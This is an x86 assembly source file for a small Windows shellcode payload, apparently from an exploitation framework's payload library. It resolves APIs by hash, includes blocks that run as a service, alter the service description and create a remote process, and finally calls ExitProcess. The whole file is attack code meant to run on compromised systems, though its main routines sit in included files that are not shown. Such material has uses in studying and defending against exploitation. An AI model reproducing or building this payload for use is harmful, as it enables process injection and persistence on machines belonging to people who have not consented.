;-----------------------------------------------------------------------------;
; Author: agix (florian.gaultier[at]gmail[dot]com)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Size: 448 bytes
; Build: >build.py single_service_stuff
;-----------------------------------------------------------------------------;

[BITS 32]
[ORG 0]

  cld                    ; Clear the direction flag.
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
%include "./src/block/block_api.asm"
start:                   ;
  pop ebp                ; pop off the address of 'api_call' for calling later.
%include "./src/block/block_service.asm"
%include "./src/block/block_service_change_description.asm"
%include "./src/block/block_create_remote_process.asm"
%include "./src/block/block_service_stopped.asm"

push edi
push 0x56A2B5F0
call ebp		;call ExitProcess(0)
